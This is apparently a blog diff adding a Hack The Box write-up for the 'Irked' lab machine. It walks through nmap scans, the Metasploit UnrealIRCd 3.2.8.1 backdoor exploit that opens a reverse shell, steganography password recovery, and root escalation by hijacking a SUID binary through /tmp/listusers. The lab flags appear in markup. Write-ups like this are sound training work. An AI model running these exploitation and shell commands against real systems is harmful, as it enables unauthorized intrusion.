@@ -1,0 +1,268 @@
+---
+layout: default
+title: Irked
+---
+
+<h1>Irked</h1>
+<p class="date">27/04/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/irked/irked.png">
+
+<p>Irked is an easy box that requires exploiting an <code>IRC</code> backdoor and solve a stego challenge to get the user flag and to obtain root, use binaries with the <code>SUID</code> flag set.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run <code>nmap</code> to see we have ports <code>22</code>, <code>80</code> and <code>111</code> open.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/irked# nmap -sV -sC 10.10.10.117
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-24 06:40 EST
+Nmap scan report for 10.10.10.117
+Host is up (0.041s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
+|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
+|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
+|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
+80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          37078/tcp  status
+|_  100024  1          41112/udp  status
+</pre>
+
+<p>In the Apache server we have a website with the following image and text.</p>
+
+<img class="img-fluid" src="/static/img/htb/irked/1.png">
+
+<p>The site mentions an <code>IRC</code> (Internet Relay Chat), so let's run a more extensive <code>nmap</code> to see if we missed something.</p>
+
+<pre class="prettyprint">
+nmap -p- -T5 10.10.10.117
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-24 07:14 EST
+Nmap scan report for 10.10.10.117
+Host is up (0.039s latency).
+Not shown: 65528 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+6697/tcp  open  ircs-u
+8067/tcp  open  infi-async
+49684/tcp open  unknown
+65534/tcp open  unknown
+</pre>
+
+<p>Indeed, we have an <code>IRC</code> in port <code>6697</code> and we can connect to it via <code>hexdump</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/irked/2.png">
+
+<p>Reading the connection messages we can see it's running <code>Unreal3.2.8.1</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/irked/3.png">
+
+<p>Let's open <code>metasploit</code> and search for available exploits for this application.</p>
+
+<pre class="prettyprint">
+msf5 > search unreal
+
+Matching Modules
+================
+
+   Name                                        Disclosure Date  Rank       Check  Description
+   ----                                        ---------------  ----       -----  -----------
+   exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Linux)
+   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
+   exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Win32)
+</pre>
+
+<p>We have one for this exact version. During November of 2009 the official <code>Unreal3.2.8.1.tar.gz</code> was replaced for a replica that contained a backdoor, so let's give it a try.</p>
+
+<pre class="prettyprint">
+msf5 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhost 10.10.10.117
+rhost => 10.10.10.117
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rport 6697
+rport => 6697
+</pre>
+
+<p>Run it and we get a shell as <code>ircd</code>.</p>
+
+<pre class="prettyprint">
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
+
+[*] Started reverse TCP double handler on 10.10.16.38:4444 
+[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
+    :irked.htb NOTICE AUTH :*** Looking up your hostname...
+[*] 10.10.10.117:6697 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 1trnewSwD5SJ0Bf4;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "1trnewSwD5SJ0Bf4\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (10.10.16.38:4444 -> 10.10.10.117:35050) at 2019-02-28 09:15:17 +0000
+
+whoami
+ircd
+</pre>
+
+<p>Upgrade the shell with <code>python</code>.</p>
+
+<pre class="prettyprint">
+python -c 'import pty; pty.spawn("/bin/bash")' 
+ircd@irked:~/Unreal3.2$
+</pre>
+
+<p>We have the user flag in <code>djmardov</code> documents, but we don't have permissions to read it.</p>
+
+<pre class="prettyprint">
+ircd@irked:/home/djmardov/Documents$ ls -la
+ls -la
+total 16
+drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
+drwxr-xr-x 18 djmardov djmardov 4096 Nov  3 04:40 ..
+-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
+-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
+</pre>
+
+<p>But we can read <code>.backup</code> which has a strange message.</p>
+
+<pre class="prettyprint">
+ircd@irked:/home/djmardov/Documents$ cat .backup
+cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+</pre>
+
+<p>We seem to have a password for some stego challenge.</p>
+
+<p>In the initial website we had a curious image, so let's try to run <code>steghide</code> with the obtained password.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/irked# steghide extract -sf irked.jpg 
+Enter passphrase: UPupDOWNdownLRlrBAbaSSss
+wrote extracted data to "pass.txt".
+</pre>
+
+<p>Yep, we extracted a txt file with a new password.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/irked# cat pass.txt 
+Kab6h+m+bbp2J:HG
+</pre>
+
+<p>We can use this pass to <code>ssh</code> as <code>djmardov</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/irked# ssh djmardov@10.10.10.117
+djmardov@10.10.10.117's password: Kab6h+m+bbp2J:HG
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Feb 28 04:15:06 2019 from 10.10.12.195
+djmardov@irked:~$ 
+</pre>
+
+<p>Now we have the right permissions to read the user flag.</p>
+
+<pre class="prettyprint">
+djmardov@irked:~/Documents$ cat user.txt
+<span flag="4a66a78b12dc0e661a59d3f5c0267a8e">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>Looking for files with the <code>SUID</code> flag set we can see a strange binary <code>/usr/bin/viewuser</code>.</p>
+
+<pre class="prettyprint">
+djmardov@irked:/$ find / -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount
+</pre>
+
+<p>If we execute it we see it's trying to open a file in <code>/tmp/listusers</code>.</p>
+
+<pre class="prettyprint">
+djmardov@irked:/$ /usr/bin/viewuser -h
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-02-28 04:14 (:0)
+djmardov pts/0        2019-02-28 04:15 (10.10.12.195)
+djmardov pts/3        2019-02-28 04:19 (10.10.16.38)
+djmardov pts/1        2019-02-28 04:21 (10.10.14.225)
+sh: 1: /tmp/listusers: not found
+</pre>
+
+<p>We're going to add a file in that path which will run <code>/bin/sh</code>.</p>
+
+<pre class="prettyprint">
+djmardov@irked:/$ echo '/bin/sh' > /tmp/listusers
+djmardov@irked:/$ chmod +x /tmp/listusers
+</pre>
+
+<p>Now if we execute <code>/usr/bin/viewuser</code> it will run our <code>/tmp/listusers</code> opening a shell as root, because <code>viewuser</code> was being executed as root.</p>
+
+<pre class="prettyprint">
+djmardov@irked:/$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2019-02-28 04:14 (:0)
+djmardov pts/0        2019-02-28 04:15 (10.10.12.195)
+djmardov pts/3        2019-02-28 04:19 (10.10.16.38)
+djmardov pts/1        2019-02-28 04:21 (10.10.14.225)
+djmardov pts/4        2019-02-28 04:25 (10.10.12.195)
+# id    
+uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
+</pre>
+
+<p>We have the root flag in root's directory.</p>
+
+<pre class="prettyprint">
+# cat /root/root.txt
+<span flag="8d8e9e8be64654b6dccc3bff4522daf3">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
